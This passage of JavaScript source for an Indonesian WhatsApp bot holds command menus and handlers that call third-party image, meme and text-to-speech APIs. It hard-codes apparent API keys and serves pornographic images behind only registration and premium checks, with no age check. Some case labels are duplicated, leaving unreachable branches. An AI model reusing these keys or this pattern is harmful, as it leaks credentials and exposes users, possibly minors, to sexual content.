 •├❍ ${prefix}sandwriting text
 •├❍ ${prefix}sandsummer text
 •├❍ ${prefix}sandengraved text
 •├❍ ${prefix}metaldark text
 •├❍ ${prefix}neonlight text
 •├❍ ${prefix}holographic text
 •├❍ ${prefix}text1917 text
 •├❍ ${prefix}minion text
 •├❍ ${prefix}deluxesilver text
 •├❍ ${prefix}newyearcard text
 •├❍ ${prefix}bloodfrosted text
 •├❍ ${prefix}halloween text
 •├❍ ${prefix}jokerlogo text
 •├❍ ${prefix}fireworksparkle text
 •├❍ ${prefix}natureleaves text
 •├❍ ${prefix}bokeh text
 •├❍ ${prefix}toxic text
 •├❍ ${prefix}strawberry text
 •├❍ ${prefix}box3d text
 •├❍ ${prefix}roadwarning text
 •├❍ ${prefix}breakwall text
 •├❍ ${prefix}icecold text
 •├❍ ${prefix}luxury text
 •├❍ ${prefix}cloud text
 •├❍ ${prefix}summersand text
 •├❍ ${prefix}horrorblood text
 •├❍ ${prefix}thunder text
 •├❍ ${prefix}pornhub text1 text2
 •├❍ ${prefix}glitch text1 text2
 •├❍ ${prefix}avenger text1 text2
 •├❍ ${prefix}space text1 text2
 •├❍ ${prefix}ninjalogo text1 text2
 •├❍ ${prefix}marvelstudio text1 text2
 •├❍ ${prefix}lionlogo text1 text2
 •├❍ ${prefix}wolflogo text1 text2
 •├❍ ${prefix}steel3d text1 text2
 •├❍ ${prefix}wallgravity text1 text2
  ╰───────────────────
  ╭❍ *PHOTO OKY*
 •├──────────────────
 •├❍ ${prefix}shadow text
 •├❍ ${prefix}cup text
 •├❍ ${prefix}cup1 text
 •├❍ ${prefix}romance text
 •├❍ ${prefix}smoke text
 •├❍ ${prefix}burnpaper text
 •├❍ ${prefix}lovemessage text
 •├❍ ${prefix}undergrass text
 •├❍ ${prefix}love text
 •├❍ ${prefix}coffe text
 •├❍ ${prefix}woodheart text
 •├❍ ${prefix}woodenboard text
 •├❍ ${prefix}summer3d text
 •├❍ ${prefix}wolfmetal text
 •├❍ ${prefix}nature3d text
 •├❍ ${prefix}underwater text
 •├❍ ${prefix}golderrose text
 •├❍ ${prefix}summernature text
 •├❍ ${prefix}letterleaves text
 •├❍ ${prefix}glowingneon text
 •├❍ ${prefix}fallleaves text
 •├❍ ${prefix}flamming text
 •├❍ ${prefix}harrypotter text
 •├❍ ${prefix}carvedwood text
 •├❍ ${prefix}tiktok text1 text2
 •├❍ ${prefix}arcade8bit text1 text2
 •├❍ ${prefix}battlefield4 text1 text2
 •├❍ ${prefix}pubg text1 text2
  ╰───────────────────
  ╭❍ *EPHOTO MENU*
 •├──────────────────
 •├❍ ${prefix}wetglass text
 •├❍ ${prefix}multicolor3d text
 •├❍ ${prefix}watercolor text
 •├❍ ${prefix}luxurygold text
 •├❍ ${prefix}galaxywallpaper text
 •├❍ ${prefix}lighttext text
 •├❍ ${prefix}beautifulflower text
 •├❍ ${prefix}puppycute text
 •├❍ ${prefix}royaltext text
 •├❍ ${prefix}heartshaped text
 •├❍ ${prefix}birthdaycake text
 •├❍ ${prefix}galaxystyle text
 •├❍ ${prefix}hologram3d text
 •├❍ ${prefix}greenneon text
 •├❍ ${prefix}glossychrome text
 •├❍ ${prefix}greenbush text
 •├❍ ${prefix}metallogo text
 •├❍ ${prefix}noeltext text
 •├❍ ${prefix}glittergold text
 •├❍ ${prefix}textcake text
 •├❍ ${prefix}starsnight text
 •├❍ ${prefix}wooden3d text
 •├❍ ${prefix}textbyname text
 •├❍ ${prefix}writegalacy text
 •├❍ ${prefix}galaxybat text
 •├❍ ${prefix}snow3d text
 •├❍ ${prefix}birthdayday text
 •├❍ ${prefix}goldplaybutton text
 •├❍ ${prefix}silverplaybutton text
 •├❍ ${prefix}freefire text  
  ╰───────────────────
  ╭❍ *DOWNLOADER*
 •├──────────────────
 •├❍ ${prefix}fb 
 •├❍ ${prefix}igdl 
 •├❍ ${prefix}igdl2 
 •├❍ ${prefix}twitter 
 •├❍ ${prefix}tiktok 
 •├❍ ${prefix}tiktok2
 •├❍ ${prefix}play 
 •├❍ ${prefix}ythd 
 •├❍ ${prefix}ytmp3 
 •├❍ ${prefix}ytmp4 
 •├❍ ${prefix}soundcloud 
 •├❍ ${prefix}tiktoknowm 
 •├❍ ${prefix}tiktokaudio
 •├❍ ${prefix}mediafire 
 •├❍ ${prefix}joox 
 •├❍ ${prefix}nhentaipdf *code*
  ╰───────────────────
  ╭❍ *MEDIA MENU*
 •├──────────────────
 •├❍ ${prefix}brainly *query*
 •├❍ ${prefix}cuaca *query*
 •├❍ ${prefix}tts *code_bahasa* *query*
 •├❍ ${prefix}translate *code_bahasa* *query*
 •├❍ ${prefix}shopee *product*
 •├❍ ${prefix}playstore *query*
 •├❍ ${prefix}ssweb *query*
 •├❍ ${prefix}google *query*
 •├❍ ${prefix}image *query*
 •├❍ ${prefix}pinterest *query*
 •├❍ ${prefix}nulis *teks*
 •├❍ ${prefix}iguser *ussername*
 •├❍ ${prefix}igstalk *username*
 •├❍ ${prefix}githubstalk *username*
 •├❍ ${prefix}tiktokstalk *ussername*
 •├❍ ${prefix}img2url *reply foto*
 •├❍ ${prefix}ytsearch *query*
  ╰───────────────────
  ╭❍ *STICKER MENU*
 •├──────────────────
 •├❍ ${prefix}dadu
 •├❍ ${prefix}doge
 •├❍ ${prefix}toimg
 •├❍ ${prefix}patrick
 •├❍ ${prefix}garwgura
 •├❍ ${prefix}ttg *teks*
 •├❍ ${prefix}attp *teks*
 •├❍ ${prefix}attp2 *teks*
 •├❍ ${prefix}ttp *teks*
 •├❍ ${prefix}ttp1 *teks*
 •├❍ ${prefix}ttp2 *teks*
 •├❍ ${prefix}ttp3 *teks*
 •├❍ ${prefix}ttp4 *teks*
 •├❍ ${prefix}stickeranime
 •├❍ ${prefix}semoji *emoji*
 •├❍ ${prefix}sticker *reply foto/video*
 •├❍ ${prefix}smeme *teks|teks*
 •├❍ ${prefix}swm *pack|author*
 •├❍ ${prefix}take *pack|author* 
 •├❍ ${prefix}tovideo *reply sgif*
  ╰───────────────────
  ╭❍ *IMAGE EFEK*
 •├──────────────────
 •├❍ ${prefix}triggered
 •├❍ ${prefix}pencil
 •├❍ ${prefix}skullmask
 •├❍ ${prefix}pixelate
 •├❍ ${prefix}deefry
 •├❍ ${prefix}alien
 •├❍ ${prefix}darkjoke
 •├❍ ${prefix}meme
 •├❍ ${prefix}joke
 •├❍ ${prefix}tosmile
 •├❍ ${prefix}wasted
 •├❍ ${prefix}hitler
 •├❍ ${prefix}wanted
 •├❍ ${prefix}greyscale
 •├❍ ${prefix}trash
 •├❍ ${prefix}circle
 •├❍ ${prefix}blur
 •├❍ ${prefix}tinyurl
 •├❍ ${prefix}cuttly
 •├❍ ${prefix}removebg
 •├❍ ${prefix}affect
 •├❍ ${prefix}picture
  ╰───────────────────
  ╭❍ *GAME MENU*
 •├──────────────────
 •├❍ ${prefix}slot
 •├❍ ${prefix}limitgame
 •├❍ ${prefix}gelud @tag
 •├❍ ${prefix}tictactoe @tag
 •├❍ ${prefix}siapaaku
 •├❍ ${prefix}family100
 •├❍ ${prefix}kuismath
 •├❍ ${prefix}asahotak
 •├❍ ${prefix}tebaklirik
 •├❍ ${prefix}tebaklagu
 •├❍ ${prefix}tebakkata
 •├❍ ${prefix}susunkata
 •├❍ ${prefix}kimiakuis
 •├❍ ${prefix}caklontong
 •├❍ ${prefix}tebakjenaka
 •├❍ ${prefix}tebakanime
 •├❍ ${prefix}tebaktebakan
 •├❍ ${prefix}tebakgambar
 •├❍ ${prefix}tebakbendera
 •├❍ ${prefix}suit *batu/kertas/gunting*
  ╰───────────────────
  ╭❍ *FUN MENU*
 •├──────────────────
 •├❍ ${prefix}mining
 •├❍ ${prefix}mutual
 •├❍ ${prefix}togel
 •├❍ ${prefix}cekwatak
 •├❍ ${prefix}cekmati [nama]
 •├❍ ${prefix}wangy [nama]
 •├❍ ${prefix}citacita
 •├❍ ${prefix}toxic
 •├❍ ${prefix}truth
 •├❍ ${prefix}dare
 •├❍ ${prefix}apakah
 •├❍ ${prefix}bisakah
 •├❍ ${prefix}kapankah
 •├❍ ${prefix}rate
 •├❍ ${prefix}jadian
 •├❍ ${prefix}cantik
 •├❍ ${prefix}ganteng
 •├❍ ${prefix}beban
 •├❍ ${prefix}babi
 •├❍ ${prefix}cekganteng
 •├❍ ${prefix}cekcantik
  ╰───────────────────
  ╭❍ *ISLAM MENU*
 •├──────────────────
 •├❍ ${prefix}listsurah
 •├❍ ${prefix}alquran
 •├❍ ${prefix}alquranaudio
 •├❍ ${prefix}asmaulhusna
 •├❍ ${prefix}kisahnabi
 •├❍ ${prefix}jadwalsholat
  ╰───────────────────
  ╭❍ *MOVIE MENU*
 •├──────────────────
 •├❍ ${prefix}drakorongoing
 •├❍ ${prefix}lk21 query
 •├❍ ${prefix}wattpad url_wattpad
 •├❍ ${prefix}wattpadsearch query
 •├❍ ${prefix}cerpen
 •├❍ ${prefix}ceritahoror
  ╰───────────────────
  ╭❍ *RANDO IMAGE*
 •├──────────────────
 •├❍ ${prefix}ppcp
 •├❍ ${prefix}bj
 •├❍ ${prefix}ero
 •├❍ ${prefix}cum
 •├❍ ${prefix}feet
 •├❍ ${prefix}yuri
 •├❍ ${prefix}trap
 •├❍ ${prefix}lewd
 •├❍ ${prefix}feed
 •├❍ ${prefix}eron
 •├❍ ${prefix}solo
 •├❍ ${prefix}gasm
 •├❍ ${prefix}poke
 •├❍ ${prefix}anal
 •├❍ ${prefix}holo
 •├❍ ${prefix}tits
 •├❍ ${prefix}kuni
 •├❍ ${prefix}kiss
 •├❍ ${prefix}erok
 •├❍ ${prefix}smug
 •├❍ ${prefix}baka
 •├❍ ${prefix}solog
 •├❍ ${prefix}feetg
 •├❍ ${prefix}lewdk
 •├❍ ${prefix}waifu
 •├❍ ${prefix}pussy
 •├❍ ${prefix}femdom
 •├❍ ${prefix}cuddle
 •├❍ ${prefix}hentai
 •├❍ ${prefix}eroyuri
 •├❍ ${prefix}cum_jpg
 •├❍ ${prefix}blowjob
 •├❍ ${prefix}erofeet
 •├❍ ${prefix}holoero
 •├❍ ${prefix}classic
 •├❍ ${prefix}erokemo
 •├❍ ${prefix}fox_girl
 •├❍ ${prefix}futanari
 •├❍ ${prefix}lewdkemo
 •├❍ ${prefix}wallpaper
 •├❍ ${prefix}pussy_jpg
 •├❍ ${prefix}kemonomimi
 •├❍ ${prefix}nsfw_avatar
 •├❍ ${prefix}ngif
 •├❍ ${prefix}nsfw_neko_gif
 •├❍ ${prefix}random_hentai_gif
  ╰───────────────────
  ╭❍ *RANDOM TEXT*
 •├──────────────────
 •├❍ ${prefix}quotes
 •├❍ ${prefix}quotesdilan
 •├❍ ${prefix}quotesanime
 •├❍ ${prefix}quotesimage
 •├❍ ${prefix}faktaunik
 •├❍ ${prefix}katabijak
 •├❍ ${prefix}pantun
 •├❍ ${prefix}bucin
 •├❍ ${prefix}randomnama
  ╰───────────────────
  ╭❍ *INFORMATION*
 •├──────────────────
 •├❍ ${prefix}update
 •├❍ ${prefix}level
 •├❍ ${prefix}rules
 •├❍ ${prefix}profile
 •├❍ ${prefix}waktu
 •├❍ ${prefix}botstat
 •├❍ ${prefix}sewabot
 •├❍ ${prefix}listsewa
 •├❍ ${prefix}owner
 •├❍ ${prefix}ping
 •├❍ ${prefix}runtime
 •├❍ ${prefix}donasi
 •├❍ ${prefix}leaderboard
 •├❍ ${prefix}cekpremium
 •├❍ ${prefix}listpremium
 •├❍ ${prefix}sourcecode
 •├❍ ${prefix}bugreport *keluhan*
  ╰───────────────────
 *_BOT MASIH DALAM TAHAP PENGEMBANGAN,JIKA TERDAPAT BUG ATAU EROR HARAP DI MAKLUMI_*
`
foter = '@Mizuki Botz'
let syng = fs.readFileSync('./media/kiki.jpg')
               buttons =  [{buttonId: `${prefix}sewabot`, buttonText: {displayText: 'BUY PREMIUM'}, type: 1},{buttonId: `${prefix}ikyygroup`, buttonText: {displayText: 'JOIN GROUP'}, type: 1},{buttonId: `${prefix}owner`, buttonText: {displayText: '👥CREATOR'}, type: 1},]

                    dimas.sendMessage(from, { contentText: menu, footerText: foter, buttons: buttons, headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: syng, contextInfo: {mentionedJid: [sender]}}}, 'buttonsMessage', { quoted: dim})
   break
   case 'triggered':
case 'pencil':
case 'wasted':
case 'fisheye':
case 'skullmask':
case 'alien':
case 'tosmile':
case 'invert':
case 'pixelate':
case 'deepfry':
       // if (!isRegistered) return reply(ind.noregis())
               // if (isLimit(sender)) return reply(ind.limitend(pusname))
               // if (isLimit(sender)) return reply(ind.limitend(pusname))
                //if (isBanned) return reply('Maaf kamu sudah terbenned!')
    var imgbb = require('imgbb-uploader')
    if ((isMedia && !dim.message.videoMessage || isQuotedImage) && args.length == 0) {
      ted = isQuotedImage ? JSON.parse(JSON.stringify(dim).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: dim
      reply('Wait....')
      owgi = await dimas.downloadAndSaveMediaMessage(ted)
      anu = await imgbb("16721ac29279183de385d717c663e681", owgi)
      hehe = await getBuffer(`http://api.lolhuman.xyz/api/editor/${command}?apikey=${lol}&img=${anu.display_url}`)
     dimas.sendMessage(from, hehe, image, {quoted:freply})
    } else {
      reply('Jangan tambah kan apapun pada command')
    }
    break
   case 'imageefek':
   wibu = `
┏━▹ IMAGE MANIPULATION
┃▹ ${prefix}triggered
┃▹ ${prefix}pencil
┃▹ ${prefix}skullmask
┃▹ ${prefix}pixelate
┃▹ ${prefix}deefry
┃▹ ${prefix}alien
┃▹ ${prefix}darkjoke
┃▹ ${prefix}meme
┃▹ ${prefix}joke
┃▹ ${prefix}tosmile
┃▹ ${prefix}wasted
┃▹ ${prefix}hitler
┃▹ ${prefix}wanted
┃▹ ${prefix}greyscale
┃▹ ${prefix}trash
┃▹ ${prefix}circle
┃▹ ${prefix}blur
┃▹ ${prefix}tinyurl
┃▹ ${prefix}cuttly
┃▹ ${prefix}removebg
┃▹ ${prefix}affect
┃▹ ${prefix}picture
┗━▹

`
                   sendButMessage(from, wibu, `@Alwi Ofc`, [
          {
            buttonId: `!menu`,
            buttonText: {
              displayText: `⬡ BACK TO MENU `,
            },
            type: 1,
          },]);
        break;
case 'textpro':

wibu = `
┏━▹「 Text Pro Me 」
┃▹ ${prefix}blackpink text
┃▹ ${prefix}neon text
┃▹ ${prefix}greenneon text
┃▹ ${prefix}advanceglow text
┃▹ ${prefix}futureneon text
┃▹ ${prefix}sandwriting text
┃▹ ${prefix}sandsummer text
┃▹ ${prefix}sandengraved text
┃▹ ${prefix}metaldark text
┃▹ ${prefix}neonlight text
┃▹ ${prefix}holographic text
┃▹ ${prefix}text1917 text
┃▹ ${prefix}minion text
┃▹ ${prefix}deluxesilver text
┃▹ ${prefix}newyearcard text
┃▹ ${prefix}bloodfrosted text
┃▹ ${prefix}halloween text
┃▹ ${prefix}jokerlogo text
┃▹ ${prefix}fireworksparkle text
┃▹ ${prefix}natureleaves text
┃▹ ${prefix}bokeh text
┃▹ ${prefix}toxic text
┃▹ ${prefix}strawberry text
┃▹ ${prefix}box3d text
┃▹ ${prefix}roadwarning text
┃▹ ${prefix}breakwall text
┃▹ ${prefix}icecold text
┃▹ ${prefix}luxury text
┃▹ ${prefix}cloud text
┃▹ ${prefix}summersand text
┃▹ ${prefix}horrorblood text
┃▹ ${prefix}thunder text
┃▹ ${prefix}pornhub text1 text2
┃▹ ${prefix}glitch text1 text2
┃▹ ${prefix}avenger text1 text2
┃▹ ${prefix}space text1 text2
┃▹ ${prefix}ninjalogo text1 text2
┃▹ ${prefix}marvelstudio text1 text2
┃▹ ${prefix}lionlogo text1 text2
┃▹ ${prefix}wolflogo text1 text2
┃▹ ${prefix}steel3d text1 text2
┃▹ ${prefix}wallgravity text1 text2
┗━▹ `
sendButMessage(from, wibu, `@ A L W I\n@ M I Z U K I  B O T`, [
          {
            buttonId: `!menu`,
            buttonText: {
              displayText: `⬡ BACK TO MENU `,
            },
            type: 1,
          },]);
break

case 'wibu2':
case 'wibumenu2':
wibu = `
┏━▹ MENU
┃▹ chiisaihentai
┃▹ trap
┃▹ blowjob
┃▹ yaoi
┃▹ ecchi
┃▹ hentai
┃▹ ahegao
┃▹ hololewd
┃▹ sideoppai
┃▹ animefeets
┃▹ animebooty
┃▹ animethighss
┃▹ hentaiparadise
┃▹ animearmpits
┃▹ hentaifemdom
┃▹ lewdanimegirls
┃▹ biganimetiddies
┃▹ animebellybutton
┃▹ hentai4everyone
┗━▹
`
                   sendButMessage(from, wibu, `@ A L W I\n@ M I Z U K I  B O T`, [
          {
            buttonId: `!menu`,
            buttonText: {
              displayText: `⬡ BACK TO MENU `,
            },
            type: 1,
          },]);
        break;
        case 'randomimage':
case 'randomimage':
wibu = `
┏━▹ MENU
┃▹ ppcp
┃▹ bj
┃▹ ero
┃▹ cum
┃▹ feet
┃▹ yuri
┃▹ trap
┃▹ lewd
┃▹ feed
┃▹ eron
┃▹ solo
┃▹ gasm
┃▹ poke
┃▹ anal
┃▹ holo
┃▹ tits
┃▹ kuni
┃▹ kiss
┃▹ erok
┃▹ smug
┃▹ baka
┃▹ solog
┃▹ feetg
┃▹ lewdk
┃▹ waifu
┃▹ pussy
┃▹ femdom
┃▹ cuddle
┃▹ hentai
┃▹ eroyuri
┃▹ cum_jpg
┃▹ blowjob
┃▹ erofeet
┃▹ holoero
┃▹ classic
┃▹ erokemo
┃▹ fox_girl
┃▹ futanari
┃▹ lewdkemo
┃▹ wallpaper
┃▹ pussy_jpg
┃▹ kemonomimi
┃▹ nsfw_avatar
┃▹ ngif
┃▹ nsfw_neko_gif
┃▹ random_hentai_gif
┗━▹
`
                   sendButMessage(from, wibu, `@ A L W I\n@ M I Z U K I  B O T`, [
          {
            buttonId: `!menu`,
            buttonText: {
              displayText: `⬡ BACK TO MENU `,
            },
            type: 1,
          },]);
        break;
        
        case 'photoxy':
case 'photooky':
wibu = `
┏━▹ MENU
┃▹ shadow text
┃▹ cup text
┃▹ cup1 text
┃▹ romance text
┃▹ smoke text
┃▹ burnpaper text
┃▹ lovemessage text
┃▹ undergrass text
┃▹ love text
┃▹ coffe text
┃▹ woodheart text
┃▹ woodenboard text
┃▹ summer3d text
┃▹ wolfmetal text
┃▹ nature3d text
┃▹ underwater text
┃▹ golderrose text
┃▹ summernature text
┃▹ letterleaves text
┃▹ glowingneon text
┃▹ fallleaves text
┃▹ flamming text
┃▹ harrypotter text
┃▹ carvedwood text
┃▹ tiktok text1 text2
┃▹ arcade8bit text1 text2
┃▹ battlefield4 text1 text2
┃▹ pubg text1 text2
┗━▹
`
                   sendButMessage(from, wibu, `@ A L W I\n@ M I Z U K II  B O T`, [
          {
            buttonId: `!menu`,
            buttonText: {
              displayText: `⬡ BACK TO MENU `,
            },
            type: 1,
          },]);
        break;
        
        case 'ephoto':
case 'ephotomenu':
wibu = `
┏━▹「 Ephoto 360 」
┃▹ wetglass text
┃▹ multicolor3d text
┃▹ watercolor text
┃▹ luxurygold text
┃▹ galaxywallpaper text
┃▹ lighttext text
┃▹ beautifulflower text
┃▹ puppycute text
┃▹ royaltext text
┃▹ heartshaped text
┃▹ birthdaycake text
┃▹ galaxystyle text
┃▹ hologram3d text
┃▹ greenneon text
┃▹ glossychrome text
┃▹ greenbush text
┃▹ metallogo text
┃▹ noeltext text
┃▹ glittergold text
┃▹ textcake text
┃▹ starsnight text
┃▹ wooden3d text
┃▹ textbyname text
┃▹ writegalacy text
┃▹ galaxybat text
┃▹ snow3d text
┃▹ birthdayday text
┃▹ goldplaybutton text
┃▹ silverplaybutton text
┃▹ freefire text
┗━▹
`
                   sendButMessage(from, wibu, `@ A L W I\n@ M I Z U K I  B O T`, [
          {
            buttonId: `!menu`,
            buttonText: {
              displayText: `⬡ BACK TO MENU `,
            },
            type: 1,
          },]);
        break;

                   // Random Text //
                  ///// LOLHUMAN API
case 'chiisaihentai':
                case 'trap':
                case 'blowjob':
                case 'yaoi':
                case 'ecchi':
                case 'hentai':
                case 'ahegao':
                case 'hololewd':
                case 'sideoppai':
                case 'animefeets':
                case 'animebooty':
                case 'animethighss':
                case 'hentaiparadise':
                case 'animearmpits':
                case 'hentaifemdom':
                case 'lewdanimegirls':
                case 'biganimetiddies':
                case 'animebellybutton':
                case 'hentai4everyone':
                       if (!isRegistered) return sendButMessage(from, maaf, mod, tombar,{quoted:freply})
                               // if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})
            if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:freply})
                reply (mess.wait)
              buff = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${lol}`)
              buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await dimas.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'@ M I Z U K I  B O T', imageMessage: imageMsg,
              contentText:`Follow @dimas.edr`,buttons,headerType:4}
              prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              dimas.relayWAMessage(prep)
       
                    break
                case 'bj':
                case 'ero':
                case 'cum':
                case 'feet':
                case 'yuri':
                case 'trap':
                case 'lewd':
                case 'feed':
                case 'eron':
                case 'solo':
                case 'gasm':
                case 'poke':
                case 'anal':
                case 'holo':
                case 'tits':
                case 'kuni':
                case 'kiss':
                case 'erok':
                case 'smug':
                case 'baka':
                case 'solog':
                case 'feetg':
                case 'lewdk':
                case 'waifu':
                case 'pussy':
                case 'femdom':
                case 'cuddle':
                case 'hentai':
                case 'eroyuri':
                case 'cum_jpg':
                case 'blowjob':
                case 'erofeet':
                case 'holoero':
                case 'classic':
                case 'erokemo':
                case 'fox_girl':
                case 'futanari':
                case 'lewdkemo':
                case 'wallpaper':
                case 'pussy_jpg':
                case 'kemonomimi':
                case 'nsfw_avatar':
                       if (!isRegistered) return sendButMessage(from, maaf, mod, tombar,{quoted:freply})
                //if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})
             if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:freply})
                reply (mess.wait)
               buff = await getBuffer(`https://api.lolhuman.xyz/api/random2/${command}?apikey=${lol}`)
                buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await dimas.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'@ M I Z U K I  B O T', imageMessage: imageMsg,
              contentText:`Follow @dimas.edr`,buttons,headerType:4}
              prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              dimas.relayWAMessage(prep)
        
                    break

                    // Textprome //
                case 'blackpink':
                case 'neon':
                case 'greenneon':
                case 'advanceglow':
                case 'futureneon':
                case 'sandwriting':
                case 'sandsummer':
                case 'sandengraved':
                case 'metaldark':
                case 'neonlight':
                case 'holographic':
                case 'text1917':
                case 'minion':
                case 'deluxesilver':
                case 'newyearcard':
                case 'bloodfrosted':
                case 'halloween':
                case 'jokerlogo':
                case 'fireworksparkle':
                case 'natureleaves':
                case 'bokeh':
                case 'toxic':
                case 'strawberry':
                case 'box3d':
                case 'roadwarning':
                case 'breakwall':
                case 'icecold':
                case 'luxury':
                case 'cloud':
                case 'summersand':
                case 'horrorblood':
                case 'thunder':
                       if (!isRegistered) return sendButMessage(from, maaf, mod, tombar,{quoted:freply})

                                if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})

                reply (mess.wait)
                    if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    ini_txt = args.join(" ")
                  buff = await getBuffer(`https://api.lolhuman.xyz/api/textprome/${command}?apikey=${lol}&text=${ini_txt}`)
                 buttons = [{buttonId: `!menu`,buttonText:{displayText: `BACK MENU`},type:1}]
              imageMsg = (await dimas.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'@ M I Z U K I  B O T', imageMessage: imageMsg,
              contentText:`Follow @dimas.edr`,buttons,headerType:4}
              prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              dimas.relayWAMessage(prep)
        
                    break
                case 'pornhub':
                case 'glitch':
                case 'avenger':
                case 'space':
                case 'ninjalogo':
                case 'marvelstudio':
                case 'lionlogo':
                case 'wolflogo':
                case 'steel3d':
                case 'wallgravity':
                       if (!isRegistered) return sendButMessage(from, maaf, mod, tombar,{quoted:freply})
                                if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})

                reply (mess.wait)
                    if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    txt1 = args[0]
                    txt2 = args[1]
                 buff = await getBuffer(`https://api.lolhuman.xyz/api/textprome2/${command}?apikey=${lol}&text1=${txt1}&text2=${txt2}`)
                          buttons = [{buttonId: `!menu`,buttonText:{displayText: `BACK MENU`},type:1}]
              imageMsg = (await dimas.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'@ M I Z U K I  B O T', imageMessage: imageMsg,
              contentText:`Follow @dimas.edr`,buttons,headerType:4}
              prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              dimas.relayWAMessage(prep)
        
                    break

                    // Photo Oxy //
                case 'shadow':
                case 'cup':
                case 'cup1':
                case 'romance':
                case 'smoke':
                case 'burnpaper':
                case 'lovemessage':
                case 'undergrass':
                case 'love':
                case 'coffe':
                case 'woodheart':
                case 'woodenboard':
                case 'summer3d':
                case 'wolfmetal':
                case 'nature3d':
                case 'underwater':
                case 'golderrose':
                case 'summernature':
                case 'letterleaves':
                case 'glowingneon':
                case 'fallleaves':
                case 'flamming':
                case 'harrypotter':
                case 'carvedwood':
                       if (!isRegistered) return sendButMessage(from, maaf, mod, tombar,{quoted:freply})
                                if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})

                reply (mess.wait)
                    if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    ini_txt = args.join(" ")
                  buff = await getBuffer(`https://api.lolhuman.xyz/api/photooxy1/${command}?apikey=${lol}&text=${ini_txt}`)
                          buttons = [{buttonId: `!menu`,buttonText:{displayText: `BACK MENU`},type:1}]
              imageMsg = (await dimas.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'@ M I Z U K I  B O T', imageMessage: imageMsg,
              contentText:`Follow @dimas.edr`,buttons,headerType:4}
              prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              dimas.relayWAMessage(prep)
        
                    break
                     case 'gtts':
                case 'tts':
                                       if (!isRegistered) return sendButMessage(from, maaf, mod, tombar,{quoted:freply})
                                if (args.length < 1) return dimas.sendMessage(from, 'Diperlukan kode bahasa kak!!', text, {quoted: freply})
                    const gtts = require('./lib/gtts')(args[0])
                    if (args.length < 2) return dimas.sendMessage(from, 'Textnya mana kakak sayang?', text, {quoted: freply})
                    dtt = body.slice(8)
                    ranm = getRandom('.mp3')
                    rano = getRandom('.ogg')
                    dtt.length > 500
                    ? reply('Textnya kebanyakan kakak!! 😤')
                    : gtts.save(ranm, dtt, function() {
                        exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
                            fs.unlinkSync(ranm)
                            buffer = fs.readFileSync(rano)
                            if (err) return reply(ind.stikga())
                            dimas.sendMessage(from, buffer, audio, {quoted: freply, ptt:true})
                            fs.unlinkSync(rano)
                        })
                    })
                    await limitAdd(sender)
                break
                case 'meme':
case 'memek':
                       if (!isRegistered) return sendButMessage(from, maaf, mod, tombar,{quoted:freply})
 buff = await getBuffer ('https://leyscoders-api.herokuapp.com/api/memeindo?apikey=IkyOgiwara')

buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await dimas.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Crated by Dimas Gans', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              dimas.relayWAMessage(prep)
    
break
case 'memeindo': 
                 //if (!isRegistered) return reply( ind.noregis())
                //if (isLimit(sender)) return reply(ind.limitend(pusname))
                //if (isLimit(sender)) return reply(ind.limitend(pusname))
                //if (isBanned) return reply('Maaf kamu sudah terbenned!')
                //gatauda = body.slice(8)
                                       if (!isRegistered) return sendButMessage(from, maaf, mod, tombar,{quoted:freply})
                reply(mess.wait)
                buff = await getBuffer(`http://api.lolhuman.xyz/api/meme/memeindo?apikey=${lol}`, {method: 'get'})
                buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
               imageMsg = (await dimas.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Crated by Dimas Gans', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              dimas.relayWAMessage(prep)
                break
                    case 'tts':
//if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
//if (!isGroup) return reply(mess.only.group)
//if(!q) return reply(`Example : ${prefix}tts id|Teks lu`)
 tt = argz[0]
 es = argz[1]
if (es > 20) return reply('Maksimal 10 kata')
reply(mess.wait)
tts = await getBuffer(`http://zekais-api.herokuapp.com/speech?lang=${tt}&text=${es}`)
